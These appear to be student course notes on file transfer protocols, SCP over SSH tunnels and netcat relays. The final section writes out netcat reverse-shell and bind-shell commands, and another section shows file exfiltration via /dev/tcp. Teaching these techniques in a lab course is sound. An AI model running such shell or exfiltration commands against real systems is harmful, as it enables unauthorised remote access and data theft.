# Day 4
# Data Transfer, Movement and Redirection

## Data Transfer
  Methods
  * TFTP
  * FTP
      * Active
      * Passive
  * SFTP
  * SCP

  ### TFTP
  Trivial File Transfer Protocol
  * RFC 1350 Rev2
  * UDP transport
  * insecure
  * no terminal communication()

  ### FTP
  * RFC 959
  * TCP transport across multiple connections
  * Control Conection (21)/ Data Connection (20)
  * insecure
  * Anonymous login

  Commands:

      Passive  # will turn Passive mode on or off
      # Passive vs. Active mode will determine who initiated the connection
      # Active : ftp server will initiate the connection
      # Passive: Our host machine will initiate the conncection.
      get <file>
      wget -r ftp://<ip>  # Run instead of logging into box. 
      
  ### SFTP
  Secure File Transfer Protocol
  * TCP transpot (TCP port 22)
  * adds FTP like services to SSH
  * Interactive terminal access
  * Authentication through sign in

  ### FTPS
  File Transfer Prototcol Secure
  * TCP transport ( TCP port 443 )
  * Adds SSL/TLS encryption to FTP
  * Authentication
  * Interactive Terminal access

  ### SCP
  Secure Copy Protocol
  * TCP Transport (TCP port 22)
  * non interactive
  * Authentication

  Download a file from a remote directory to a local Directory

    $ scp student@172.16.82.106:secretstuff.txt /home/student

  Upload a file to a remote directory from a local directory

    $ scp secretstuff.txt student@172.16.82.106:/home/student

  Copy a file from a remote host to a separate remote host

    $ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student


#### SCP Syntax w/ alternate SSHD (Alternate ssh port):
  * Download a file from a remote directory to a local directory

        $ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student

  * Upload a file to a remote directory from a local directory

        $ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student

#### SCP Syntax through a tunnel

ssh student@172.16.82.106 -L 1111:localhost:22 -NT

* Download a file from a remote directory to a local directory

      $ scp -P 1111 student@localhost:secretstuff.txt /home/student

* Upload a file to a remote directory from a local directory

      $ scp -P 1111 secretstuff.txt student@localhost:/home/student


## Network Tunneling

## Traffic Redirection
Netcat Listener always needs to be set up first
### NETCAT: Client to listener file transfer

    Client (sends file): nc 10.2.0.2 9001 < file.txt
    Listener (receive file): nc -l -p 9001 > newfile.txt
    
### NETCAT: Listener to Client file transfer

    Listener (sends file): nc -l -p 9001 < file.txt
    Client (receive file): nc 10.2.0.2 9001 > newfile.txt


### NETCAT Relay Demos

On Client Relay:
    
    # Internet host: 
    nc 10.1.0.2  9002 (middle ip from internet host)
    
    # Middle Man: 
    mknod mypipe p
    nc -lp 9002 0< mypipe | nc -lp 9001 1> mypipe  ## Relay on the middle man

    # End point
    nc 10.2.0.2 9001 (Ip of middle man from end point)
    
  ####  Reverse setup
  
  * Internet host

         nc -lp 1234
  * end host

        nc -lp 4321
  * Middle man
    
        mknod mypipe p
        nc 10.10.0.40 1234 0<mypipe | nc 192.168.1.10 4321 1> mypipe
    
On Listener2 (sends info):

    nc -l -p 9002 < infile.txt

On Listener1 (receives info):

    nc -l -p 9001 > outfile.txt

Writes the output to listener1 and listener2 through the named pipe


### File Transfer with /dev/tcp

On the receiving box:

    nc -l -p 1111 > file.txt

On the sending box:

    cat file.txt > /dev/tcp/10.2.0.2/1111

This method is useful for host that does not have NETCAT available.

### Reverse shell using NETCAT

When shelled into the remote host using -c :

    nc -c /bin/sh <your ip> <any unfiltered port>

You could even pipe BASH through NETCAT.

    /bin/sh | nc <your ip> <any unfiltered port>

Then listen for the shell.

    nc -l -p <same unfiltered port> -vvv

You can also listen using the -e with NETCAT.

    nc -l -p <any unfiltered port> -e /bin/bash
